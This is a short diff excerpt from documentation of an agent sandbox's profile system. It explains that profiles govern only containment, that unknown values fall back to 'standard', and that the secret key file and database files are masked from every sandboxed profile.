+- The profile governs containment only. It never gates a tool, a host or a secret ([trust.md](trust.md#the-invariant)).
+- Unknown values fall through to `standard` in `sandbox_policy_from_profile()` (`src/sandbox.c`). `sandbox_profile_resolve()` copies the result into the `SandboxProfile` once, in `agent_setup_init()`.
+- **`.cclaw_key` and the DB family are outside every sandboxed profile's mount set**, so no sandboxed child can read the secret key or the DB ciphertext. Both are masked unconditionally, and a path grant that would expose either is refused at grant time. `host` (no sandbox) is exposed by construction. See [Secret Storage](#secret-storage).
